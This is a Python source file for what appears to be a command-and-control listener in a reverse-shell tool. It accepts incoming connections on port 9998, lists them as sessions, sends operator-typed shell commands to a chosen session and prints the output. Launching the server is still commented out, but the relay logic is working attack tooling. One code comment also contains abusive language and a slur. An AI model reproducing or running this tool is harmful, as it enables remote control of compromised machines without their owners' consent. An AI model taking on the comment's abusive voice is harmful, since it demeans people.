import commands_handler
import threading
import socket
import sys

IP = '0.0.0.0'
PORT = 9998
sessions = []

def handle_client(client_socket, address):
    print(f"[+] New session from {address[0]}:{address[1]}")
    while True:
        try:
            # Can't you fucking write the comments in english, RETARD!!!!!!
            # فقط ينتظر الأوامر من السيرفر ولا يرسل شيء من نفسه
            pass
        except:
            break

def command_interface():
    while True:
        print("\n--- Active Sessions ---")
        for i, (sock, addr) in enumerate(sessions):
            print(f"{i+1}) {addr[0]}:{addr[1]}")
        try:
            choice = int(input("Select session number (0 to refresh): "))
            if choice == 0:
                continue
            sock, addr = sessions[choice - 1]
            while True:
                cmd = input(f"[{addr[0]}]$ ")
                if cmd.strip().lower() in ('exit', 'back'):
                    break
                sock.send(cmd.encode())
                result = sock.recv(4096).decode()
                print(result)
        except (ValueError, IndexError):
            print("[!] Invalid session.")

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((IP, PORT))
    server.listen(5)
    print(f'[*] Listening on {IP}:{PORT}')

    threading.Thread(target=command_interface, daemon=True).start()

    while True:
        client, address = server.accept()
        sessions.append((client, address))
        client_handler = threading.Thread(target=handle_client, args=(client, address), daemon=True)
        client_handler.start()

if __name__ == '__main__':
    
    # You can add all of this to a seperated function
    # Or even move it to commands_handler or make a new args_handler file
    try:
        if len(sys.argv) <= 1:
            commands_handler.print_logo()
            # TODO run the server
        
        if len(sys.argv) >= 2:
            # Check if the provided argument in avaliable
            if sys.argv[1] not in commands_handler.AVALIABLE_EXECUTION_COMMANDS:
                exit("\n\t[-] Command not found!\n\t[+] Use { -h, --help } to print the help message\n")
            # If the argument is avaliable
            elif sys.argv[1] in commands_handler.AVALIABLE_EXECUTION_COMMANDS:
                # If the argument is { -h, --help } print the execution help message
                if sys.argv[1] == '-h' or sys.argv[1] == '--help':
                    print(commands_handler.execution_args_help_message())
                # If the argument is { -l, --logo } print the logo
                elif sys.argv[1] == '-l' or sys.argv[1] == '--logo':
                    commands_handler.print_logo()
                # If the argument is { -c, --commands } print all the avaliable commands inside the running server
                elif sys.argv[1] == '-c' or sys.argv[1] == '--commands':
                    print(commands_handler.avaliable_commands())
    except:
        exit("\n\t[-] Something went wrong!\n\t[+] Use { -h, --help } to print the help message\n")
    
    #print(commands_handler.execution_args_help_message())
    #main()